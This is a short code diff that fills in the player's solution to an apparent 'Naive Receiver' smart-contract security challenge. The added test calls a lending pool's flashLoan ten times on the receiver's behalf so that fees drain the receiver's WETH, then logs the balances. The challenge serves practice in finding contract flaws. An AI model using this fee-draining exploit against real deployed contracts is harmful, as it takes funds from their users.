@@ -77,7 +77,12 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        console.log("Player WETH balance: ", weth.balanceOf(player));
+        for (uint8 i = 0; i < 10; i++) {
+            pool.flashLoan(receiver, address(weth), 0, "");
+        }
+        console.log("Pool WETH balance: ", weth.balanceOf(address(pool)));
+        console.log("Receiver WETH balance: ", weth.balanceOf(address(receiver)));
     }
 
     /**
